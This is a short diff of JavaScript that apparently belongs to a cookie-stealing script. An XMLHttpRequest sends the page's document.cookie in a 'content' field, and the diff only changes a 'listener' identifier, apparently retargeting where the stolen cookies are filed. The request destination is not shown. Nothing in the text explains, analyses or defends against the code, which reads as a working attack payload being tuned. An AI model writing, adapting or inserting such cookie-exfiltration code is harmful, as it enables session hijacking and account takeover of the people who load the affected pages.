@@ -8,4 +8,4 @@ xhr.onreadystatechange = function() {
   }
 };
 
-xhr.send('header=fdsafdsa&listener=admin123123&content=' + document.cookie);
+xhr.send('header=fdsafdsa&listener=admin789789&content=' + document.cookie);
